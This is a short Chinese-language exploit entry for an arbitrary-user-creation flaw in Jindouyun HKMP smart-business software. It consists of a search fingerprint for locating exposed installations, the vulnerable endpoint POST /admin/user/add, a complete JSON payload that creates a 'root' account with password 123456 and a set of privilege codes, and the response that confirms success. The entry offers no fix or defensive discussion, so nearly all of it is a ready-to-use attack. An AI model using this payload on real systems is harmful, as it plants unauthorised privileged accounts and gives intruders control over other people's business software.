# 金斗云HKMP智慧商业软件任意用户创建漏洞

金斗云HKMP智慧商业软件任意用户创建 ｜ 其他 ｜ —
- **指纹**：`body="金斗云 Copyright"`
- **请求**：`POST /admin/user/add HTTP/1.1`

**Payload**
```
{"appId":"hkmp","mchId":"hkmp","deviceId":"hkmp","timestamp":1719305067,"nonce":5223015867,"sign":"hkmp","data":{"userCode":"root","userName":"root","password":"123456","privilege":["1000","8000","8010","2000","2001","2010","7000"],"adminUserCode":"admin","adminUserName":"系统管理员"}}
```
- **响应特征**：200 用户添加成功